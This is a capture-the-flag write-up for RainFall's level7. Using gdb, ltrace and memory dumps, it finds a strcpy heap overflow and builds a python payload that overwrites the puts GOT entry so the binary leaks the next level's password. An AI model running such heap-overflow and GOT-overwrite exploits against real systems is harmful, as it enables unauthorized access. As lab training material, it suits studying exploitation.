We disassemble the code with our favorite tools:
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)
   0x08048588 <+103>:   mov    0xc(%ebp),%eax
   0x0804858b <+106>:   add    $0x4,%eax
   0x0804858e <+109>:   mov    (%eax),%eax
   0x08048590 <+111>:   mov    %eax,%edx
   0x08048592 <+113>:   mov    0x1c(%esp),%eax
   0x08048596 <+117>:   mov    0x4(%eax),%eax
   0x08048599 <+120>:   mov    %edx,0x4(%esp)
   0x0804859d <+124>:   mov    %eax,(%esp)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax
   0x080485b3 <+146>:   mov    0x4(%eax),%eax
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    $0x80486e9,%edx
   0x080485c7 <+166>:   mov    $0x80486eb,%eax
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

The `main` contains 4 malloc(8), let's check it out with `ltrace`:
```bash
level7@RainFall:~$ ltrace ./level7 AAAA BBBBB
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                               = 0x0804a008
malloc(8)                               = 0x0804a018
malloc(8)                               = 0x0804a028
malloc(8)                               = 0x0804a038
strcpy(0x0804a018, "AAAA")              = 0x0804a018
strcpy(0x0804a038, "BBBBB")             = 0x0804a038
fopen("/home/user/level8/.pass", "r")   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
```

Let's try finding the addresses of the mallocs and what `strcpy tries to copy. To do this we analyse the memory right before `fopen`:
```bash
(gdb) r AAAAAA BBBBBB
Starting program: /home/user/level7/level7 AAAAAA BBBBBB

Breakpoint 1, 0x080485d3 in main ()
(gdb) x/18x 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x00004141	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x00004242	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000
```

With all this info, we find that the goal in this level is to **replace the address of the 2nd argument** `0x0804a038` with the address of `puts`, and then put the address of the `m()` function as our 2nd argument. We also find out that the overflow happens with 20 chars.
The `m()` function will let us printf what `gets` copied from the main:
main():
```bash
0x080485e4 <+195>:	movl   $0x8049960,(%esp)
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
```

m():
```bash
0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
0x08048517 <+35>:	mov    %edx,(%esp)
0x0804851a <+38>:	call   0x80483b0 <printf@plt>
```

Let's get `puts`'s GOT address:
```bash
level7@RainFall:~$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

And now that we've got all this, let's craft the script:
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

And boom next flag !